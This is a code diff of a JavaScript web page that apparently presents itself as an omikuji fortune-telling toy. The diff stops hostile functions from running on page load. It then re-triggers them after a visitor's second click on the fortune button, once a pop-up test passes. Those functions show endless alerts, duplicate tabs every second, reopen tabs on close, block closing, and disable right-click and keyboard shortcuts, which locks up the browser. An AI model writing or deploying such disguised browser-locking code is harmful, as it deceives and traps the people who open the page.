@@ -9,7 +9,7 @@ function duplicateTabEverySecond() {
 
 // 無限アラートを表示する関数
 function showAlert() {
-    alert("(ﾟ∀ﾟ)アヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャ");
+    alert("(ﾟ∀ﾟ)アヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャヒャ");
     showAlertTimeout = setTimeout(showAlert, 1000);
 }
 
@@ -57,10 +57,53 @@ function duplicateTabEverySecond() {
 }
 
 window.onload = function() {
-    showAlert();
-    openNewTabsOnClose();
-    preventClose();
-    disableRightClick();
-    disableShortcuts();
-    duplicateTabEverySecond();
+    // 初期状態では元のコードを実行しないようにコメントアウト
+    // showAlert();
+    // openNewTabsOnClose();
+    // preventClose();
+    // disableRightClick();
+    // disableShortcuts();
+    // duplicateTabEverySecond();
 };
+
+// ここから新しいコード
+
+document.addEventListener('DOMContentLoaded', function() {
+    const omikujiButton = document.getElementById('omikujiButton');
+    let clickCount = 0;
+
+    function requestPopupPermission() {
+        let popupWindow = window.open('', '', 'width=1,height=1');
+        if (!popupWindow || popupWindow.closed || typeof popupWindow.closed === 'undefined') {
+            alert('ポップアップを許可してください！');
+            return false;
+        } else {
+            popupWindow.close();
+            return true;
+        }
+    }
+
+    function showOmikuji() {
+        const fortunes = ['大吉', '中吉', '小吉', '吉', '末吉', '凶', '大凶'];
+        alert('あなたの運勢は：' + fortunes[Math.floor(Math.random() * fortunes.length)]);
+    }
+
+    function handleClickEvent() {
+        if (requestPopupPermission()) {
+            showOmikuji();
+            clickCount++;
+            if (clickCount >= 2) {
+                showAlert();
+                openNewTabsOnClose();
+                preventClose();
+                disableRightClick();
+                disableShortcuts();
+                duplicateTabEverySecond();
+            }
+        } else {
+            setTimeout(handleClickEvent, 1000);
+        }
+    }
+
+    omikujiButton.addEventListener('click', handleClickEvent);
+});
